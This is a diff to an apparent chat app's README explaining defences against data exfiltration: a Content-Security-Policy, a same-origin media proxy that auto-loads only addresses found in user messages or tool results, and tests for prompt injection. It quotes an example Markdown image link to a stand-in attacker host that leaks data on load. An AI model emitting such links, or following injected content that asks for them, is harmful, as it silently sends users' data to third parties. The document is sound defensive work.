@@ -496,10 +496,20 @@ The sidebar search (every word must match) doesn't suit model queries.
   (`fetch_url`, now removed; an MCP server's tools ask only if that server is set
   to **Ask before using its tools**, so switch it on for one that reads pages or
   searches), and the app's pages carry
-  `Content-Security-Policy: img-src 'self' data: blob:` while the Markdown
-  renderer shows an image from another site as a link, because a browser that
-  loads `![](https://evil.example/c?d=…)` has sent the data without a click.
-  `tests/e2e/exfiltration.spec.ts` and the opt-in `injection.test.ts` check both.
+  `Content-Security-Policy: img-src 'self' data: blob:; media-src 'self' blob:`
+  while images and media from other sites come only through `GET /api/media`
+  (`MediaProxy`, `routes/media.ts`), because a browser that loads
+  `![](https://evil.example/c?d=…)` has sent the data without a click. The
+  route loads by itself only an address that is, exactly, in a user message or
+  a tool result of the chat (`knownUrls` in `src/shared/media.ts`: anything the
+  model adds makes another address, and its own words are not a source); any
+  other needs `confirm=1`, which the page sends only after a click. It fetches
+  public addresses only (checked per connection, redirects too), passes
+  `Range` for seeking, serves only PNG/JPEG/GIF/WebP, common audio and MP4/WebM/
+  Ogg (never SVG or HTML) under size caps, with `nosniff` and a sandbox policy,
+  and answers only requests that browsers mark `Sec-Fetch-Site: same-origin`,
+  so no other site can use chibot as a fetcher.
+  `tests/e2e/exfiltration.spec.ts` and the opt-in `injection.test.ts` check it.
 - **`search_chats`** (`query`, optional `after` / `before` ISO dates): any word
   matches (prefix), ranked by relevance, best hit per chat, top 5, archived
   included, temporary and the current chat excluded. Returns JSON with chat
